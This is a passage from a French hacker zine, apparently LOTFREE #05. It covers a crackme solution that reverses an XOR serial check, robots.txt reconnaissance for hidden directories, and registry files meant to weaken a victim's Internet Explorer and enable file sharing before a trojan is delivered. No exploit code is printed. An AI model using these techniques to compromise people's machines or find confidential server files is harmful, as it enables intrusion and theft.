        xor cl, al &lt;-- al vaut 52h et cl est le premier caract&egrave;re du 
        code ('S'). Le r&eacute;sultat est cl=01. La code est donc devenu 49,52,49,01<br>
        mov dl, al &lt;-- eax=52<br>
        ...<br>
        shl edx, 8 &lt;-- d&eacute;calage de 8 bits, 52 devient 5200<br>
        or dx, ax &lt;-- dx = 5200 or 52 = 5252<br>
        xor cx, dx &lt;-- cx = cx xor dx = 4901 xor 5252 = 1b53. Le code devient 
        donc 49,52,1b,53<br>
        shl edx, 10 &lt;-- 5252 devient 52520000<br>
        or edx, eax &lt;-- edx = 52520000 or 5252 = 52525252<br>
        xor ecx, edx &lt;-- ecx = 49521b53 xor 52525252 = 1b004901<br>
        cmp ecx, 07114501 &lt;-- r&eacute;sultat attendu<br>
        jnz 0040111F</p>
      <p>Il faut donc avoir 07114501 &agrave; la fin.<br>
        Reprenons depuis le d&eacute;but : Notre code est mis dans un registre 
        donc on prend que les 4 premiers caract&egrave;res.<br>
        Le r&eacute;sultat est xor&eacute; avec 00000052<br>
        Le r&eacute;sultat est xor&eacute; avec 00005252<br>
        Le r&eacute;sultat est xor&eacute; avec 52525252<br>
        Comme le xor est r&eacute;versible notre code est en fin de compte xor&eacute; 
        avec 52520052.<br>
        Il faut obtenir 07114501. On xor ce nombre avec 52520052 et on obtient 
        55434553 soit 'UCES'. Comme la string est &agrave; l'envers on en d&eacute;duit 
        que le d&eacute;but du bon code est 'SECU'. Or le code est sur 8 lettres. 
        Je refl&eacute;chi au premier mot qui satisfait &ccedil;a : SECURITY, 
        je l'entre, c'est bon !!</p>
      </td>
  </tr>
  <tr> 
    <td height="14" valign="top" class="textgras" bgcolor="#000000"><a name="robots"></a>Trouver 
      des documents confidentiels sur un serveur</td>
  </tr>
  <tr> 
    <td height="132" valign="top" class="textpetit"> 
      <p>Hehehe !! Voil&agrave; un truc que j'ai d&eacute;couvert ya pas si longtemps 
        mais qui date quand m&ecirc;me un peu. Cela dit &ccedil;a devient super 
        int&eacute;ressant si l'admin du serveur n'est pas tr&egrave;s malin :) 
        On commence par une petite intro/d&eacute;fouloir.</p>
      <p>Bon, vous venez d'acheter le dernier zataz version papier et vous apprennez 
        que ce cher Damien Bancal a une fois de plus d&eacute;couvert qu'il &eacute;tait 
        possible d'acc&egrave;der aux codes de lancements des missiles am&eacute;ricains 
        et ce juste en tappant une url dans un navigateur. D&eacute;cidemment 
        il est tr&egrave;s fort ce Bancal !!! Comme c'est aussi quelqu'un d'une 
        infinie bont&eacute; et que ces informations pourraient devenir plus que 
        dangereuses dans des mains ennemies, il met vite au courant l'administrateur 
        du site, qui comme par hazard n'&eacute;tait pas au courant (LoL : - Eh 
        patron !!! Ya encore un lamer qu'&agrave; d&eacute;couvert nos faux codes 
        de lancement &agrave; la place d'un taliban !! Qu'est-ce qu'on fait ? 
        - Ben tu les changes connard !!!). Et puis ils sortent le champagne (Youpi 
        !! C'est la f&ecirc;te du slip !!!). Attention ne manquez pas le prochain 
        num&eacute;ro avec tout sur comment Damien Bancal a r&eacute;ussi &agrave; 
        d&eacute;jouer les plans d'une bande de hackers-terroristes russe qui 
        essayait de s'emparer par le biais de la steganographie des plans de la 
        prochaine navette spaciale am&eacute;ricaine !! Et comment il a spoof&eacute; 
        le serveur de saddam hussein pour r&eacute;cup&eacute;rer les d&eacute;marches 
        strat&eacute;giques de ce dernier dans un microdisque et aussi quand il 
        a sauve James Bond d'une mort attroce !!</p>
      <p>Mais alors comment il fait ? Ben en fait voil&agrave; une des r&eacute;ponses 
        possibles. Les moteurs de recherche, appel&eacute;s agents int&eacute;ligents, 
        ou plus dans notre cas robots d'indexation recherchent sans relache toute 
        sorte d'information et ils les stockent en m&eacute;moire. Quand on leur 
        soumet une page, il la d&eacute;plombe, regarde les balises META pour 
        conna&icirc;tre le sujet, les mots cl&eacute;s... Puis il &eacute;tudient 
        le reste de la page et r&eacute;cup&egrave;re les liens ins&eacute;r&eacute;s 
        dans les pages. Ensuite ils visitent les pages sur lequelles pointent 
        ces liens et ainsi de suite...<br>
        Vous avez s&ucirc;rement remarqu&eacute; quand vous faite une recherche 
        sur Google le lien &quot;relancer en incluant les pages similaires&quot;. 
        Ben en fait comme le robot d'indexation est pas si intelligent car pour 
        lui la m&ecirc;me page web avec deux sessions diff&eacute;rentes n'est 
        pas la m&ecirc;me page. En fait quand le robot arrive sur infoshackers 
        par exemple, il lui est donn&eacute; une cl&eacute; de session. Le lien 
        alors cr&eacute;&eacute; dinamiquement est de la forme infoshackers.com/index?id=dfgdg654dfg. 
        Le probl&egrave;me c'est que quand il revient, il ouvre une autre session 
        et le lien n'est plus le m&ecirc;me. Si vous cliquer sur &quot;relancer 
        en incluant les pages similaires&quot; vous tomberez sur 96 fois la page 
        d'accueil de infoshackers mais juste avec des cl&eacute;s de sessions 
        diff&eacute;rentes. <br>
        De m&ecirc;me ces robots peuvent se montrer indiscret et une page perdue 
        dans l'internet qui se croyait &agrave; l'abri des regards simplement 
        car l'adresse n'a pas &eacute;t&eacute; enregistr&eacute;e aupr&egrave;s 
        des annuaires se retrouvera t&ocirc;t ou tard catalogu&eacute;e.</p>
      <p>Les plaintes faites par les administrateurs ont mont&eacute;es en force 
        et le W3C a fini par trancher : les diff&eacute;rents robots doivent &ecirc;tre 
        capable de ne pas indexer des pages si on leur le demande. Le W3C a donc 
        d&eacute;fini une norme qui s'est divis&eacute;e en deux techniques mais 
        seule la premi&egrave;re nous int&eacute;resse vraiment.</p>
      <p>En fait il suffit &agrave; l'administrateur de mettre &agrave; la racine 
        de son serveur un fichier robots.txt (toujours avec un 's' et toujours 
        en minuscules) qui d&eacute;clare au robot qui passerait quelles pages 
        il a le droit de visiter, et quelles pages il lui est interdit d'enregistrer.</p>
      <p>Ce fichier peux contenir des commentaires si ils commencent par un # 
        (comme en script Unix).<br>
        Il s'articule aupr&egrave;s de trois variables qui peuvent &ecirc;tre 
        r&eacute;p&eacute;t&eacute;es autant de fois que l'on veut mais elles 
        respectent presque toujours le m&ecirc;me ordre.<br>
        La premi&egrave;re variable utilis&eacute;e est la variable 'User-agent'. 
        Vient ensuite les variables 'Disallow' et 'Allow'. Comme un exemple vaut 
        mieux qu'un long discours...</p>
      <p>#exemple de robots.txt<br>
        #doit &ecirc;tre plac&eacute; &agrave; la racine du site. Par exemple 
        : www.fbi.gov/robots.txt<br>
        User-agent: Yahoo #la suite ne concerne que le moteur Yahoo<br>
        Disallow:/cgi-bin/ # interdit Yahoo de fouiner dans le repertoire des 
        CGIs</p>
      <p>User-agent: Googlebot # la suite ne concerne que le moteur de Google<br>
        Disallow:/top-secret/ # on peut mettre plusieurs disallow &agrave; la 
        suite <br>
        Disallow:/admin/<br>
        Disallow:/test.html</p>
      <p>User-agent: Scooter # nom du robot de Altavista<br>
        Disallow: #on lui permet de tout prendre, pareil que Allow:/ (la racine)</p>
      <p>User-agent: Gulliver # robot de Northern Light<br>
        Disallow:/ # Ce robot ne doit rien indexer</p>
      <p>User-agent: ArchitextSpider #(Excite)<br>
        Allow: /index.html<br>
        Allow: /miroir.html # si l'index ne fait pas le lien sur le miroir, il 
        est judicieux de demander au robot de l'indexer<br>
        #####FIN########</p>
      <p>Notez que l'on peut le faire en s'adressant &agrave; tous les robots 
        :<br>
        User-agent: *<br>
        En revanche l'&eacute;toile ne marche pas avec les permissions (pas de 
        /admin/*) car le caract&egrave;re cl&eacute; est '/' qui permet soit de 
        tout prendre ou soit de ne rien prendre.</p>
      <p>Vous comprenez que si l'admin n'est pas malin, il n'a pas pens&eacute; 
        qu'un pirate peut demander son fichier robots.txt et voir par exemple 
        qu'il existe un rep admin, un rep top-secret ainsi qu'une page test.html 
        cach&eacute; aux yeux du meilleur moteur de recherche : Google. En effet 
        Google a &eacute;volu&eacute; mais son noyau, Googlebot n'a pas chang&eacute; 
        depuis la cr&eacute;ation de la startup, comme quoi il est super puissant.</p>
      <p>Qui a int&eacute;r&ecirc;t &agrave; ne pas voir des documents secrets 
        archiv&eacute;s par des moteurs de recherche ? Beaucoup de monde &eacute;videmment 
        :) Mais si vous regardez les sites militaires am&eacute;ricains vous vous 
        appercevrez qu'ils en sont bond&eacute;s. Certains ont m&ecirc;me un message 
        aux hackers du style :<br>
        # Les documents de ce site sont confidentiels..... puni par la loi...<br>
        Evidemment quand &ccedil;a commence comme &ccedil;a vous trouverez pas 
        de liens int&eacute;ressant. Mais certains ni pensent pas et il est donc 
        possible de trouver de tels documents.</p>
      <p>Deuxi&egrave;me m&eacute;thode : on l'inclue dans des balises m&eacute;ta. 
        La diff&eacute;rence ? Pas de notion de s&eacute;curit&eacute;. Juste 
        si on veux que le moteur de recherche suive toujours le m&ecirc;me chemin 
        en visitant le site, il suffit de mettre dans la page les balises suivantes 
        :<br>
        &lt;metaname=&quot;robots&quot; content=&quot;noindex, follow&quot;&gt;<br>
        n'indexe pas la page, visite les liens.<br>
        &lt;metaname=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&gt;<br>
        n'indexe pas la page, ne visite pas les liens.<br>
        &lt;metaname=&quot;robots&quot; content=&quot;index, follow&quot;&gt;<br>
        indexe la page, visite les liens.<br>
        &lt;metaname=&quot;robots&quot; content=&quot;index, nofollow&quot;&gt;<br>
        indexe la page, ne visite pas les liens.</p>
      <p></p>
      <p> R&eacute;f&eacute;rences : www.devparadise.com, www.e-pub.cc et www.robotstxt.org<br>
        Les noms des diff&eacute;rents moteurs est ici : http://www.robotstxt.org/wc/active/html/<br>
        Bon hack !!</p>
    </td>
  </tr>
  <tr> 
    <td height="13" valign="top" class="textgras" bgcolor="#000000"><a name="OS4"></a>Rendre 
      une personne vuln&eacute;rable sur Internet - Utilisation sournoise de la 
      base de registre par OS4M4CKERS</td>
  </tr>
  <tr> 
    <td height="58" valign="top" class="textpetit"> 
      <p>Cette fois OS4M4CKERS nous a concoct&eacute; deux fichiers reg (base 
        de registre windows) mais pas les moindres car l'un permet de baisser 
        au maximum la s&eacute;curit&eacute; du navigateur Internet Explorer (msie.reg 
        dans le rep &quot;fichiers&quot;) rendant alors ce dernier vuln&eacute;rable 
        aux derni&egrave;res failles de s&eacute;curit&eacute;s (ex&eacute;cution 
        de code arbitraire ou t&eacute;l&eacute;chargement d'un logiciel puis 
        installation). On peut alors se d&eacute;brouiller pour que la victime 
        lance &agrave; son insus un cheval de troie ou autre.<br>
        Le second fichier reg (&quot;share-on.reg) va magnifiquement bien avec 
        le premier car il permet de mettre le PC en partage NetBios facilitant 
        nettement la tache du pirate. M&eacute;lang&eacute;e avec un peu de social 
        engeneering, le r&eacute;sultat est d&eacute;tonnant :) (ouais bon j'ai 
        utilis&eacute; le champ lexical de la cuisine mais bon c'est pour le sta&iuml;le 
        !! Alors Ma&iuml;t&eacute;, quoi de neuf aujourd'hui ?)</p>
      <p>Vous n'aurez pas &agrave; chercher beaucoup pour trouver un exploit pour 
        IE6, une simple recherche sur packetstorm suffira :)<br>
        D'ailleurs vous trouverez ci-joint un exploit &agrave; titre de d&eacute;monstration 
        (malware.html), totalement inoffensif car il s'agit juste d'un joli effet 
        de feu en assembleur. Cette faille est la plus dangereuse d&eacute;couverte 
        sur msIE6 car elle ex&eacute;cute du code arbitraire qui est inclue dans 
        la page html elle-m&ecirc;me et non pas d&eacute;j&agrave; install&eacute; 
        sur le PC de la victime. Ben oui, d'un simple clic, vous pouvez tomber 
        sur le pire des virus :( Il est possible que cette page soit consid&eacute;r&eacute;e 
        comme un virus par votre antivirus mais je vous rassure elle est totalement 
        inofensive (ne marche que sous IE6).</p>
      <p>Pendant que l'on est dans IE et la base de registre, &ccedil;a vous dirait 
        pas de changer le titre de la fen&ecirc;tre ? Je veux parler du &quot;Microsoft 
        Internet Explorer fournis par ...&quot; ?<br>
        Ben oui c'est possible !! Il existe une valeur qui correspond &agrave; 
        ce titre dans la base de registre. Vous trouverez de quoi modifier cela 
        dans le fichier title.reg.</p>
    </td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="conclusion"></a>Conclusion</td>
  </tr>
  <tr> 
    <td height="70" valign="top" class="textpetit"> 
      <p>Voici le moment que vous attendez tous, c'est &agrave; dire comme &agrave; 
        chaque fin de LOTFREE, la c&eacute;l&egrave;bre question : Que vas t'on 
        faire la prochaine nuit Cortex ? Et bien la m&ecirc;me chose que toute 
        les nuits Minux, tenter de conqu&eacute;rir le monde !!! Nan &eacute;videmment, 
        la question est &quot;Est-ce que y'aura un LOTFREE#06 ?&quot; <br>
        Ben je vais dire oui, mais dans combien de temps ? Oulala !! Faut mieux 
        pas que vous soyez impatient !!!<br>
        De m&ecirc;me le contenu aura sans doute chang&eacute;, plus de programmation 
        s&ucirc;rement :) Mais j'essayerais de continuer car c'est triste tous 
        ces zines qui s'arr&ecirc;tent quand ils deviennent int&eacute;ressant 
        :)<br>
        Je vais en profiter pour faire une interface pour mon site, mettres des 
        rubriques (sisi c'est possible !! Bon la page n'a pas chang&eacute; de 
        couleur et d'image depuis 3 ans mais je vais mis mettre ;)</p>
      <p>Sinon je ne pouvais pas finir sans saluer Sword'O'Ne&Oslash;v3ri&ETH;e 
        qui a accept&eacute; de mettre mon zine accessible sur son site (www.mgth.fr.st 
        si je me trompe pas) et aussi &agrave; tous ces encul&eacute;s de infoshackers.com 
        que j'appr&eacute;cie beaucoup :)</p>
      <p>A et puis au fait :<span class="textgras"> FUCK THIS FUCKING MOTHERFUCKER 
        DISCLAMER !! FUCK THAT BULLSHIT MOTHERFUCKER HACKER !!!<br>
        sirius_black@imel.org&nbsp;&nbsp;--&nbsp;&nbsp;membres.lycos.fr/lotfree 
        </span></p>
      <p align="center"><img src="fichiers/cheshr.gif" width="320" height="200"></p>
      <p align="left">PS : D&eacute;sol&eacute; si vous trouvez que le mag est 
        moins dr&ocirc;le que d'habitude, j'ai arr&ecirc;t&eacute; la drogue !! 
        LoL !!</p>
    </td>
  </tr>
</table>
</body>
</html>
